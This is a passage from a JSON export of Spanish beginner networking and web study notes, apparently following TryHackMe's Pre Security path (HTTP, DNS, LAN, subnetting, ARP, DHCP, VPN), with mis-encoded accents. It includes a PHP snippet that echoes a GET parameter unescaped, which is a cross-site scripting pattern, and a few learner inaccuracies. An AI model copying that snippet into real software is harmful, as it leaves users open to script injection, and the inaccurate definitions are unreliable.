nuevo recurso ha sido creado (usuario o blogpost).                                                         |\n| **301 - Moved Permanently**      | Redirige al buscador del cliente a una nueva p√°gina o le dice que ha sido movida y que mire all√≠ en su lugar. |\n| **302 - Found**                  | Igual que el de arriba pero es temporal.                                                                      |\n| **400 - Bad Request**            | Le dice al buscador que algo fue mal o faltaba algo en la petici√≥n                                            |\n| **401 - Not Authorised**         | Te resalta que no est√°s autorizado a para ver este recurso.                                                   |\n| **403 - Forbidden**              | No tienes permiso apra ver esto ya est√©s loggeado o no.                                                       |\n| **405 - Method Not Allowed**     | El recurso no admite ese m√©todo (le mandas un GET a un recurso de creaci√≥n de usuarios).                      |\n| **404 - Page Not Found**         | La p√°gina tal cuel fue escrita no se ha encontrado.                                                           |\n| **500 - Internal Service Error** | El servidor se ha encontrado con un problema en tu petici√≥n y no sabe c√≥mo manejarla.                         |\n| **503 - Service Unavailable**    | El servidor no puede procesar tu solicitud por estar saturado o cerrado por mantenimiento.                    |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. HTTP Methods",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/3-http-methods/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/3. HTTP Methods.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "Los m√©todos HTTP son una manera para el cliente de ense√±ar sus intenciones al hacer una petici√≥n. Los m√°s comunes son:\n\n- GET: Toma informaci√≥n del servidor web.\n- POST: Sube informaci√≥n al servidor, creando nuevos records.\n- PUT: Es usado para subir datos para actualizar la informaci√≥n.\n- DELETE: Usado parra borrar registros/informaci√≥n del servidor.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Headers",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/5-headers/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/5. Headers.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "Los headers son trozos adicionales de informaci√≥n que podemos mandar al servidor web cuando hacemos peticiones. Aunque no hay headers estrictamente necesarios al hacer una petici√≥n HTTP, ser√° dif√≠cil de ver una web correctamente sin ellos.\n\nAlgunos headers de petici√≥n comunes son:\n\n- Host: Algunos servidores web albergan m√∫ltiples sitios web as√≠ que especificando el host podemos decirle cu√°l requerimos.\n- User-Agent: Este es el software del buscador y el n√∫mero de la versi√≥n. Esto ayuda al servidor a mostrar el formato correcto.\n- Content-Length: Le dice al servidor cu√°nta informaci√≥n esperar, de esta manera evitamos perder informaci√≥n.\n- Accept-Encoding: Le dice al servidor que tipos de m√©todos de compresi√≥n soporta de tal manera que la informaci√≥n se hace m√°s peque√±a (comprime) para su transporte por internet.\n- Cookie: Informaci√≥n mandada al servidor para ayudarle a recordar tu informaci√≥n.\n\nAlgunos headers de respuesta comunes son:\n\n- Set-Cookie: Informaci√≥n a guardar que es mandada de vuelta al servidor en cada petici√≥n.\n- Cache-Control: Cu√°nto tiempo guardar el contenido de la respuesta en la memoria cach√© del servidor antes de tener que pedirla de nuevo.\n- Content-Type: Le especifica al cliente el tipo de informaci√≥n que est√° siendo devuelta.\n- Content-Encoding: Qu√© tipo de m√©todo ha sido usado para comprimir la informaci√≥n para su transporte por internet.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. HTTP in Detail",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/0-http-in-detail/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/0. HTTP in Detail.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "[[1. What is HTTP(S)]]\n[[2. Requests and Responses]]\n[[3. HTTP Methods]]\n[[4. HTTP Status Codes]]\n[[5. Headers]]\n[[6. Cookies]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. How Web Servers Work",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/4-putting-it-all-together/3-how-web-servers-work/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/3. How Web Servers Work.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 4. Putting it All Together",
    "content": "<h2>¬øQu√© es un servidor web?</h2>\nUn servidor web es un software escuchando el tr√°fico entrante que despu√©s utiliza HTTP para responder contenido web a los clientes. Los m√°s comunes son Apache, Nginx, IIS y NodeJS. Todos devuelven archivos desde lo que se conoce como root directory, o directorio ra√≠z. Por ejemplo, Nginx y Apache comparten la misma ruta por defecto: */var/www/html* en los sistemas operativos Linux y IIS usa *C:\\inetpub\\wwwroot* para los sistemas operativos Windows. As√≠, si pediste http://www.ejemplo.com/foto,jpg, te devolver√≠a /var/www/html/foto.jpg del disco duro local.\n\n------------------\n<h2>Hosts virtuales</h2>\nLos servidores web pueden albergar m√∫ltiples sitios web con diferentes dominios. Para conseguir esto usan virtual hosts (archivos de configuraci√≥n basados en texto).El software del servidor web comprueba el nombre siendo pedido por HTTP. Si encuentra una correspondencia, la p√°gina web pedida se mostrar√°. Si no, se mostrar√° la p√°gina por defecto.\n\nLos virtual hosts pueden tener su directorio ra√≠z mapeado en diferentes lugares del disco duro, por ejemplo, one.com mapeado a /var/www/html/website_one y two.com mapeado a /var/www/html/website_two. No hay l√≠mite para el n√∫mero de p√°ginas que puedes hostear en un solo servidor.\n\n-------------\n<h2>Contenido est√°tico vs din√°mico</h2>\nEl contenido est√°tico nunca cambia, como JS, CSS, im√°genes, etc. Tambi√©n incluye al HTML que no cambia. Por el otro lado el contenidod din√°mico si que cambia dependiendo de las peticiones. Como la b√∫squeda en la web por palabras, o mostrar las √∫ltimas entradas de un blog.\n\nLos cambios que acabamos viendo se hacen en el Backend con el uso de leguajes de scripting. Se llama as√≠ porque se hace detr√°s de la escena. Todo lo que vemos en el buscador es Frontend.\n\n------------------------\n<h2>Lenguajes de scripting y backend</h2>\nNo hay mucho l√≠mite en cuanto a lo que el Backend puede conseguir y es esto lo que hace que una p√°gina sea interactiva para el usuario. Algunos ejemplos de esto son: PHP, Python, Ruby, NodeJS, Perl... Estos lenguajes pueden interactuar con bases de datos, llamar a servicios externos, procesar informaci√≥ del usuario... Un ejemplo ser√≠a si hicieras una petici√≥n al sitio web: *http://ejemplo.com/index.php?name=adam*\n\nSi el index.php estuviera construido as√≠:\n\n```php\n<html>\n\t<body>\n\t\tHello <?php echo $_GET[\"name\"]; ?>\n\t</body>\n</html>\n```\n\nAparecer√≠a el siguiente resultado:\n\n```html\n<html>\n\t<body>\n\t\tHello adam\n\t</body>\n</html>\n```\n\nNotar√°s que el cliente realmente no ve el PHP, porque este es un lenguaje de Backend. Esta interactividad abre muchos problemas de seguridad para las aplicaciones web que no han sido creadas seguramente o sanitizadas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Putting it All Together",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/4-putting-it-all-together/1-putting-it-all-together/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/1. Putting it All Together.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 4. Putting it All Together",
    "content": "Hemos aprendido que detr√°s de entrar a una p√°gina web hay muchas partes que se deben juntar. Para resumir, cuando hacemos una petici√≥n a una p√°gina web, nuestro ordenador necesita saber la IP del servidor y para esto usa el DNS. Despu√©s el ordenador habla con el servidor usando un conjunto de comandos llamado HTTP. Entonces el servidor devuelve HTML, JS, CSS, im√°genes, etc. Tu buscador entonces usa el formato correcto para ense√±ar la p√°gina web.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Putting it All Together",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/4-putting-it-all-together/0-putting-it-all-together/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/0. Putting it All Together.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 4. Putting it All Together",
    "content": "[[1. Putting it All Together]]\n[[2. Other Components]]\n[[3. How Web Servers Work]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Other Components",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/4-putting-it-all-together/2-other-components/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/2. Other Components.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 4. Putting it All Together",
    "content": "<h2>Load Balancers</h2>\nCuando el tr√°fico de una p√°gina web empieza a volverse demasiado alto o est√° corriendo una plicaci√≥n que necesita alta disponibilidad, puede que un solo servidor web ya no sirva. Los balanceadores de carga (load balancers) tienen dos caracter√≠sticas principales:\n\n1. Asegurar que las p√°ginas con mucho tr√°fico pueden soportar la carga.\n2. Ofrecer una alternativa si un servidor se cae.\n\nCuando haces una petici√≥n a una p√°gina con un load balancer, este recibir√° tu petici√≥n y la redirigir√° a uno de los servidores que tiene detr√°s. Tiene diferentes algoritmos para elegir a donde mandarlo:\n\n- Round-Robin: Se lo manda a cada servidor por turnos.\n- Weighted: Comprueba cu√°ntas peticiones tiene cada servidor y lo manda al menos ocupado.\n\nLos load balancers tambi√©n realizan comprobaciones peri√≥dicas (health check) con cada servidor para asegurar que todo vaya bien. Si alguno no responde adecuadamente, dejar√° de enviar informaci√≥n hasta que vuelva a hacerlo.\n\n------------------------\n<h2>CDN (Content Delivery Networks)</h2>\nPuede ser un recurso excelente para reducir el tr√°fico de un servidor saturado. Permite hostear archivos est√°ticos como JS, CSS, im√°genes o v√≠deos en miles de servidores diferentes alrededor del mundo. Cuando un usuario hace una petici√≥n de alguno de ellos, se busca el camino m√°s corto (f√≠sicamente) y se pide de ah√≠ en vez de, potencialmente, la otra punta del mundo.\n\n-------------------\n<h2>Databases</h2>\nPor lo general, las p√°ginas web necesitan una forma de almacenar informaci√≥n para sus usuarios. Los servidores web pueden comunicarse con las bases de datos para almacenar y/o acceder. Estas pueden variar desde archivos en texto plano hasta grupos complejos de m√∫ltiples servidores ofreciendo rapidez y resiliencia. Algunas de las m√°s comunes que encontrar√°s son: MySQL, MSSQL, MongoDB, Postgres, etc. Cada una tiene sus cualidades espec√≠ficas.\n\n-------------------\n<h2>WAF (Web Application Firewall)</h2>\nUn WAF est√° entre tu petici√≥n y el servidor web. Su prop√≥sito principal es proteger el servidor de ataque como el DoS (Denial of Service). Analiza las peticiones en busca de t√©cnicas de ataque comunes o si la petici√≥n viene de un servidor real o de un bot. Tambi√©n utiliza rate limiting para controlar las peticiones excesivas desde una IP, permitiendo s√≥lo unas cuantas desde una misma IP. Si una petici√≥n se interpreta como posible ataque se dropear√° y nunca ser√° enviada al servidor.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. DNS in Detail",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/0-dns-in-detail/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/0. DNS in Detail.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "[[1. What is DNS]]\n[[2. Domain Hierarchy]]\n[[3. Record Types]]\n[[4. Making a Request]]\n[[5. Pr√°ctica]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Domain Hierarchy",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/2-domain-hierarchy/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/2. Domain Hierarchy.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "![[008.png]]\n<h2>Top Level Domain</h2>\nUn TLD es la parte de m√°s a la derecha de un dominio. En tryhackme ser√≠a *\".com\"*. Hay dos tipos de TLD:\n\n1. gTLD: Generic TLD.\n2. ccTLD: Country Code TLD.\n\nHist√≥ricamente, un gTLD pretend√≠a decirle al usuario el uso del sitio, por ejemplo, .org para organizaciones, .gov para p√°ginas del gobierno, .edu para educaci√≥n... y los ccTLD se usaban con prop√≥sitos geogr√°ficos.\n\n<h2>Second Level Domain</h2>\nTomando tryhackme.com como ejemplo, el .com es el TLD y tryhackme es el SLD. Al registrar el SLD hay un l√≠mite de 63 caracteres y s√≥lo se pueden usar caracteres a-z, 0-9 y guiones (no se puede empezar ni acabar con los guiones o tener dos guiones consecutivos).\n\n<h2>Subdomain</h2>\nUn subdominio descansa en la parte izquierda del SLD usando un punto para separarlo, por ejemplo en el nombre admin.tryhackme.com, la parte admin es el subdominio. Tiene las mismas restricciones de creaci√≥n que un SLD. Puedes usar varios subdominios separados por puntos para crear nombres m√°s largos como jupiter.servers.tryhackme.com. Pero la longitud debe ser menor o igual a 253 caracteres. No hay l√≠mite para el n√∫mero de subdominios que puedes crear para tu dominio.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Making a Request",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/4-making-a-request/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/4. Making a Request.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": ">¬øQu√© ocurre cuando hacemos una petici√≥n DNS?\n\n1. Cuando pedimos el nombre de dominio, el ordenador primero comprueba la cach√© local. Si no est√° ah√≠ (no se ha usado recientemente) se hace una petici√≥n a tu Servidor DNS Recursivo.\n2. Un servidor DNS recursivo es normalmente dado por tu ISP pero tambi√©n puedes escoger el tuyo. Este servidor tambi√©n tienen una cach√© del mismo estilo. Si la respuesta se encuentra se manda de vuelta casi instantaaneamente. Si no, una b√∫squeda comienza, empezando por los servidores root de DNS.\n![[009.png]]\n3. Los servidores root DNS actuan como el esqueleto de internet. Su trabajo es redirigirte al TLD correcto. Para la petici√≥n www.tryhackme.com, el root server DNS identificar√° .com y lo mandar√° al servidor en el que lidia con ese TLD.\n4. Un sesrvidor TLD tiene actas de d√≥nde encontrar el servidor autorizado para responder la petici√≥n DNS. Este servidor autorizado tambi√©n se conoce como mnameserver para el dominio. El de tryhackme.com es kip.ns.cloudfare.com y uma.ns.cloudfare.com.\n5. Un servidor autorizado es el servidor responsable de guardar los records DNS para un dominio particular. Dependiendo del tipo de record, se manda de vuelta al servidor recursivo donde una copia local se almacena en la cach√©. Todos los records DNS vienen con un valor TTL (Time To Live). Este n√∫mero indica, en segundos, el tiempo que deber√≠a guardarse localmente hasta volver a mirarlo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Record Types",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/3-record-types/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/3. Record Types.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "DNS no es s√≥lo para las webs y hay muchos tipos de record DNS.\n\n<h2>A Record</h2>\nEstos records resuelven a direcciones IPv4, por ejemplo 104.26.10.229\n<h2>AAAA Record</h2>\nEstos records resuelven las direcciones IPv6, por ejemplo 2606:4700:20::681a:be5\n<h2>CNAME Record</h2>\nEstos records resuelven el nombre de dominio. Por ejemplo, la tienda online de TryHackMe tiene el subdominio store.tryhackme.com, lo que devuelve un CNAME record shops.shopify.com. Otra consulta DNS se realizar√≠a a shops.shopify.com para intentar saber la direcci√≥n IP del sitio web.\n<h2>MX Record</h2>\nEstos resuelven a la direcci√≥n de los servidores que manejan el email para el dominio solicitado. Por ejemplo, un record MX para tryhackme.com ser√≠a algo como alt1.aspmx.l.google.com. Estos records tambi√©n vienen con una flag de prioridad. Esto le dice al cliente en qu√© order probar los servidores, perfecto para cuando un servidor se cae y hace falta mandar un email a un servidor de backup.\n<h2>TXT Record</h2>\nSon records donde cualquier informaci√≥n basada en texto puede ser guardada. Tienen m√∫ltiples usos pero algunos de los m√°s comunes son:\n\n- Listar servidores que tienen la autoridad oara mandar un email en nombre del dominio.\n- Verificar la tenencia del dominio desde servidores de terceros.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is DNS",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/1-what-is-dns/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/1. What is DNS.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "Domain Name System (DNS) nos da una forma de comunicarnos con dispositivos en internet si necesidad de recurdar su IP. En lugar de recordar la IP, podemos recordar el dominio, m√°s f√°cilmente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Pr√°ctica",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/1-dns-in-detail/5-practica/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/5. Pr√°ctica.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 1. DNS in Detail",
    "content": "1. ![[012.png]]\n2. ![[010.png]]\n3. Diferentes par√°metros para buscar diferentes cosas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. DHCP",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/4-dhcp/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/4. DHCP.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "Las direccione IP pueden ser asignadas de forma manual, meti√©ndolas en los dispositivos, o autom√°ticamente, m√°s com√∫nmente utilizando un servidor DHCP (**D**ynamic **H**ost **C**onfiguration **P**rotocol).\n\nCuando un dispositivo se conecta a una red, si no ha sido asignado con una IP manualmente:\n\n1. Manda una petici√≥n (DHCP Discover) para ver si hay alg√∫n servidor DHCP en la red. \n2. El servidor (si lo hay) contesta entonces con una IP que el dispositivo podr√≠a usar (DHCP Offer). \n3. El dispositivo responde Diciendo que quiere esa IP (DHCP Request). \n4. Por √∫ltimo el servidor responde que la asignaci√≥n ha sido completada de forma exitosa (DHCP ACK).\n\n![[004.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. ARP",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/3-arp/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/3. ARP.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "Recordando [[3. Identifying Devices on a Network]], tenemos dos maneras de identificar dispositivos: IP (identificador l√≥gico) y MAC (identificador f√≠sico).\nEl ARP (Address Resolution Protocol) es la tecnolog√≠a responsable de vincular estas dos bajo un dispositivo.\nCuando un dispositivo quiere conectarse con otro, manda un broadcast a la red entera buscando ese dispositivo espec√≠fico. Los dispositivos pueden usar ARP para encontrar la direcci√≥n MAC del dispositivo en cuesti√≥n.\n\n------------\n<h2>¬øC√≥mo funciona ARP?</h2>\nCada dispositivo en una red tiene un \"√≠ndice\" para guardar informaci√≥n que se llama cach√©. En este contexto, la cach√© almacena los identificadores de otros equipos de la red.\n\nPara guardar la IP y la MAC juntas, ARP manda dos tipos de mensaje:\n\n1. ARP Request.\n2. ARP Reply.\n\nCuando un ARP Request se manda, un mensaje es broadcasted (mandado a todos) en la red al resto de dispositivos preguntando: \"¬øCu√°l es la direcci√≥n MAC que posee esta IP?\". Cuando el resto de dispositivos reciben ese mensaje, responden con un ARP Reply.\n![[003.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Intro to Subnetting",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/2-intro-to-subnetting/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/2. Intro to Subnetting.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "La subred es el t√©rmino que se le da a la divisi√≥n de una red grande en redes m√°s peque√±as. \nTomaremos un negocio como ejemplo, tenemos diferentes departamentos como:\n- Contabilidad.\n- Finanzas.\n- Recursos humanos.\n\n![[002.png]]\nLos administradores utilizan las subredes para categorizar y asignar partes espec√≠ficas de la red a sus respectivas funciones. \nEl subnetting se consigue partiendo el n√∫mero de hosts que caben en la red representado por un n√∫mero llamado la m√°scara de subred (32 bits). Debemos acordarnos aqu√≠ de lo que vimos en [[3. Identifying Devices on a Network]]. \n\nLas subredes usan las direcciones IP de tres formas diferentes:\n\n- Identificar la direcci√≥n de red.\n- Identificar la direcci√≥n del host.\n- Identificar la gateway.\n\n| **Tipo**            | **Prop√≥sito**                                                                                               | **Explicaci√≥n**                                                                                                                                          |\n| ------------------- | ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Drecci√≥n de red     | Esta direcci√≥n identifica el comienzo de la red actual y se usa para identificar la existencia de la misma. | Por ejemplo, un dispositivo con la IP 192.168.1.100 estar√° identificado en la red: 192.168.1.0                                                           |\n| Direcci√≥n de Host   | Esta direcci√≥n identifica hosts dentro de la red.                                                           | Un host de la red del ejemplo anterior podr√≠a ser: 192.168.1.100                                                                                         |\n| Gateway por defecto | Es la direcci√≥n reservada al dispositivo que manda la informaci√≥n hasta otra red (switch)                   | Cualquier informaci√≥n que viaje entre redes debe pasar por esta direcci√≥n primero. Normalmente la .1 y la .254 (0-255) est√°n reservadas para el gateway. |\n\nEn tu red de casa es poco probable que haya m√°s de 254 dispositivos conectados a la vez. De todas formas, si los hubiese, necesitar√≠as otra subred.\nAdem√°s el subnetting provee:\n\n- Eficiencia.\n- Seguridad.\n- Control total.\n\nTomando como ejemplo un caf√©, este tendr√° dos subredes:\n\n1. Una para los empleados, cajas registradoras y otros dispositivos del local.\n2. Otra para el uso general del p√∫blico.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Introduction to LAN",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/0-introduction-to-lan/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/0. Introduction to LAN.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "[[1. Introducing LAN Topologies]]\n[[2. Intro to Subnetting]]\n[[3. ARP]]\n[[4. DHCP]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introducing LAN Topologies",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-introduction-to-lan/1-introducing-lan-topologies/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Introduction to LAN/1. Introducing LAN Topologies.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 2. Introduction to LAN",
    "content": "A lo largo de los a√±os se han experimentado e implementado varios dise√±os de redes.\n\n<h2>Tipos de Topolog√≠a</h2>\n<h3>Topolog√≠a en estrella</h3>\nLa premisa principal es que los dispositivos est√°n conectados individualmente a trav√©s de un dispositivo central. Es la topolog√≠a m√°s com√∫n hoy en d√≠a debido a su confiabilidad y escalabilidad.\n\n![[descargar (1).png]]\n\nVentajas:\n1. Muy escalable.\n2. Pocas probabilidad de fallo.\n\nDesventajas:\n1. Coste elevado.\n2. Mucho mantenimiento requerido.\n<h3>Topolog√≠a de Bus</h3>\nSe basa en una conexi√≥n que se conoce como cable troncal. Es similar a las hojas de un √°rbol.\nDebido a que todos los datos viajan por la misma conexi√≥n de red, es propensa a volverse lenta y originar un cuello de botella.\n\n![[27e9ff166d2d4ad5436e27c8c9b62e6d.png]]\n\nVentajas:\n1. Coste reducido.\n2. F√°cil configuraci√≥n.\n\nDesventajas:\n1. Dif√≠cil de mantener (no se sabe d√≥nde est√° el fallo).\n2. Poco escalable.\n\n----------------------\n<h3>Topolog√≠a de Anillo</h3>\nTambi√©n conocida como la topolog√≠a de tokens. Los dispositivos est√°n conectados entre s√≠ para formar un bucle.\nCada uno de los dispositivos enviar√° los paquetes recibidos al siguiente dispositivo hasta llegar a su destino (eso si √©ste no tiene datos que enviar suyos primero).\n\n![[4cea7a4b48eacbd4db0b0d5e32068596.png]]\n\nVentajas:\n1. Poco cableado.\n2. F√°cil configuraci√≥n.\n\nDesventajas:\n1. Comunicaci√≥n ineficiente.\n2. Poco escalable (un cable cortado resulta en la rotura total de la red).\n\n-----------------------\n<h2>¬øQu√© es un Switch?</h2>\nLos switches son dispositivos dedicados dentro de una red a agregar muchos otros dispositivos. Estos m√∫ltiples dispositivos se conectan a un puerto del switch. Los switches se encuentran, por lo general, en redes grandes teniendo grupos de 4, 8, 16, 32 y 64 puertos para la conexi√≥n de los dispositivos.\n\nSon m√°s eficientes que los hubs/repetidores ya que toman nota de los dispositivos conectados y a qu√© puerto lo est√°n. De esta manera, en vez de reenviar un paquete a todos los puertos como har√≠a un hub, lo manda directamente a aquel en el que est√° el dispositivo destino.\n\n![[000.png]]\nLos switches y routers se pueden conectar los unos a los otros. Esto incrementa la fiabilidad y estabilidad de la red. Si un camino se tumba otro puede seguir funcionando. Aunque esto puede incrementar m√≠nimamente la latencia de la red. *Un peque√±o precio a pagar por una gran recompensa.*\n\n--------------\n<h2>¬øQu√© es un router?</h2>\nEl trabajo de un router es conectar redes y pasar la informaci√≥n entre ellas. Esto lo hace mediante una t√©cnica llamada routing.\nEsta es un proceso mediante el cual se crea un camino entre redes para que la informaci√≥n pueda ser entregada de manera exitosa.\n\n![[001.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Extending your Network",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/0-extending-your-network/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/0. Extending your Network.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "[[1. Introduction to Port Forwarding]]\n[[2. Firewalls 101]]\n[[3. VPN Basics]]\n[[4. LAN Networking Devices]]\n[[5. Practical - Network Simulator]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. VPN Basics",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/5-extending-your-network/3-vpn-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/5. Extending your Network/3. VPN Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 5. Extending your Network",
    "content": "Una VPN (Virtual Private Network) es una tecnolog√≠a que permite dispositivos en diferentes redes comunicarse de forma segura creando un camino dedicado entre estos dispositivos (tunnel).\n\nPor ejemplo, s√≥lo los dispositivos dentro de la misma red pueden estar comunicados directamente (dentro de un negocio). De todas formas, una VPN permite que las dos oficinas se conecten:\n\n![[004.png]]Los dispositivos conectados en la red #3 (VPN) siguen siendo parte de las redes #1 y #2. Algunos de los beneficios de usar VPN:\n\n| **Beneficio**                                                     | **Descripci√≥n**                                                                                                                                                                                            |\n| ----------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Permite redes en localzaciones geogr√°ficas diferentes conectarse. | Por ejempo, un negocio con m√∫ltiples oficinas encontrar√° de ayuda la VPN pues eso significa que servidores o infraestructura pueden ser usados por otras oficinas.                                         |\n| Ofrece privacidad.                                                | La tecnolog√≠a VPN usa encriptaci√≥n para proteger la informaci√≥n. Esta encriptaci√≥n es √∫til en lugares con wifi p√∫blica.                                                                                    |\n| Ofrece anonimato.                                                 | Los periodistas y activistas dependen muchas veces de la VPN para poder expresar sus ideas en pa√≠ses con libertad limitada.<br><br>De todas formas si el VPN guarda logs, es b√°sicamente como no usar VPN. |\nTryHackMe usa una VPN para conectarse a las m√°quinas vulnerables sin hacerlas directamente accesibles en internet. Esto significa que:\n\n- Puedes interactuar de manera segura con las m√°quinas.\n- Los proveedores de servicios como ISP's no se piensan que est√°s atacando una m√°quina en internet (lo que es ilegal).\n- La VPN provee seguridad a TryHackMe ya que las m√°quinas vulnerables.\n\nAlgunas de las tecnolog√≠as VPN son:\n\n| **Tecnolog√≠a VPN** | **Descripci√≥n**                                                                                                                                                                                                                                      |\n| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| PPP                | Esta tecnolog√≠a es usada por PPTP para permitir la autentificaci√≥n y proveer encriptaci√≥n de la informaci√≥n. Las VPN's usan claves privadas y p√∫blicas (como SSH). <br><br>Esta 